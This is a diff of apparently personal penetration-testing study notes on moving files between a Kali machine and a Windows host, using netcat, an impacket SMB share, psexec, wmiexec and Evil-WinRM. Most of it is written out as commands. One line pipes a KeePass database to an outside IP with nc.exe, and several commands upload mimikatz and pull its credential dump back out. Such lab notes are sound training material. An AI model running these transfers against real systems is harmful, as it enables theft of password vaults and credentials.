@@ -42,3 +42,57 @@ public:: true
 		  ```powershell
 		  cat C:\users\bobby\Database.kdbx | .\nc.exe 192.168.45.229 443
 		  ```
+- SMB
+	- On Kali
+	  ```bash
+	  impacket-smbserver test . -smb2support  -username user -password pass
+	  ```
+	- On Windows
+	  ```cmd
+	  net use m: \\192.168.45.229\test /user:user pass
+	  copy mimikatz.log m:\
+	  ```
+- [[impacket-psexec]]
+	- It comes with built in upload (lput) and download (lget) commands.
+	- By default files are uploaded/downloaded from the `C:\Windows` folder.
+	- Upload
+	  ```cmd
+	  C:\Windows\system32> lput mimikatz.exe
+	  [*] Uploading mimikatz.exe to ADMIN$\/
+	  C:\Windows\system32> cd C:\windows
+	  C:\Windows> dir /b mimikatz.exe
+	  mimikatz.exe
+	  ```
+	- Download
+	  ```cmd
+	  C:\Windows> lget mimikatz.log
+	  [*] Downloading ADMIN$\mimikatz.log
+	  ```
+- [[impacket-wmiexec]]
+	- It comes with built in upload (lput) and download (lget) commands.
+	- By default files are uploaded/downloaded in/from the `C:\Windows` folder.
+	- Upload
+	  ```cmd
+	  C:\Windows\system32> lput mimikatz.exe
+	  [*] Uploading mimikatz.exe to ADMIN$\/
+	  C:\Windows\system32> cd C:\windows
+	  C:\Windows> dir /b mimikatz.exe
+	  mimikatz.exe
+	  ```
+	- Download
+	  ```cmd
+	  C:\Windows> lget mimikatz.log
+	  [*] Downloading ADMIN$\mimikatz.log
+	  ```
+- [[Evil-WinRM]]
+	- It comes with built in `upload` and `download` commands.
+	- Upload
+	  ```powershell
+	  upload mimikatz.exe C:\windows\tasks\mimikatz.exe
+	  ```
+	- Download
+	  ```powershell
+	  download mimikatz.log /home/kali/Documents/pen-200
+	  ```
+- FTP
+	- Binaries in ASCII mode will make the file not executable. Set the mode to binary.
